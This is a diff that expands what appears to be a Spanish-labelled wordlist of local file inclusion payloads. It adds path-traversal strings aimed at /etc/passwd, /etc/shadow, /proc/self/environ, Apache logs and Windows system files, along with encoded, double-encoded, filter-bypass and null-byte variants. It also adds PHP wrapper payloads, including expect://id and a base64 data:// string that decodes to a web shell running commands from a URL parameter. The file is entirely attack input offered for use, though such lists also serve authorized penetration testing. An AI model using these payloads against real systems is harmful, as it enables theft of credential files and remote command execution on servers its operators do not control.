@@ -1,3 +1,54 @@
-# Payloads LFI comunes
-../../etc/passwd
+# Payloads LFI comunes - Path Traversal
+# Linux/Unix
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../etc/shadow
+../../../etc/hosts
+../../../etc/group
+../../../proc/self/environ
+../../../var/log/apache2/access.log
+../../../var/log/apache2/error.log
+
+# Windows
 ..\..\windows\win.ini
+..\..\..\windows\win.ini
+..\..\..\..\windows\win.ini
+..\..\..\..\..\windows\win.ini
+..\..\windows\system32\drivers\etc\hosts
+..\..\boot.ini
+..\..\windows\system.ini
+
+# Absolute paths
+/etc/passwd
+/etc/shadow
+/etc/hosts
+C:\windows\win.ini
+C:\boot.ini
+C:\windows\system32\drivers\etc\hosts
+
+# Encoded traversal
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
+..%2f..%2f..%2fetc%2fpasswd
+..%5c..%5c..%5cwindows%5cwin.ini
+
+# Double encoding
+%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+
+# Bypass filters
+....//....//....//etc/passwd
+..../..../..../windows/win.ini
+....\/....\/....\/etc/passwd
+....\\....\\....\\windows\\win.ini
+
+# Null byte injection (PHP < 5.3)
+../../../etc/passwd%00
+..\..\windows\win.ini%00
+
+# Wrapper protocols (PHP)
+php://filter/convert.base64-encode/resource=../../../etc/passwd
+php://filter/read=string.rot13/resource=../../../etc/passwd
+expect://id
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
